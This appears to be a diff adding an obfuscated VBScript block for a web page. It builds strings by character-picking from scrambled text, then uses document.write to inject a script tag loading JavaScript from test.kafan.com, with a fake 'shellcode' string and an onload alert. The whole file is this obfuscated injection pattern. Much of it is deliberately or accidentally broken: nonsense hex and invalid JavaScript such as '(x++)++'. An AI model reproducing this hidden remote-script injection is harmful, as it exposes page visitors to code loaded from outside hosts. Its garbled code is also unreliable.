@@ -1,0 +1,32 @@
+<script language=vbscript>
+
+dim a,ak
+a="ecxxiopgtvcxmirceeawwxwwevxl2222222222cdnioebtolanioet"
+dim i
+dim t
+dim ab,ac
+i=(Round(668923+Rnd*11698.4)+Fix(6688)) Eqv &HABCDEF
+for i=(not -2) to (not -888) step (8 or 1)
+ if (len(t) xor &H7)=3 then exit for
+ t=t & mid(a,i,1)
+next:ab=t 
+b="eabcelsgxxopemtsstexowi2scccccncc==uu++wiettttuxaiejsmeeettxernoixa[q""t""e"
+i=(CSng(Rnd)+CDbl(3.141592653)) Imp &HFEDCBA
+T=Right("Yes you are right!",3-(not (-4)))
+for i=(not(-2) and 1) to (not(-888) and 888) - 1 step (8 or 1)
+ if (len(t) xor &H5)=&O2 then exit for
+ t=t & mid(b,i,(1 and 1))
+next:ac=t 
+dim f
+f=array("iframe","src","baidu",".js",".vbs","/","base 0","china","google","base 7","probably","test","kafan","base 111","kafan hunters","base 648","end","end script","array end","document|write(\'<script src=http://test.kafan.com/script.js\')><|script>","body|onload=alert(\'you got it\')","<script src=","<|script>")
+dim s,p
+s=f
+s(6)="Run Script"
+for i=1 to 66 step 1
+ if i<len(ac) then
+   p=p & (chr((asc(mid(ac,i,1))or 8) and (11-3)))
+ end if
+next 
+document.write(ac&" ("""&f(ubound(f)-1)&f(5)&(date)&f(3)&">"")"&vbcr&vblf&ab+"('var shellcode=\'4989190859089012012508080818254648940984055a48c4010a9aaeb008489890909095a465456A2C8294548484F56F9\';var x;for(x=1;x<shellcode.length;(x++)++){x=shellcode.length?4:7;writeshellcode}function writeshellcode{}')")
+
+</script>
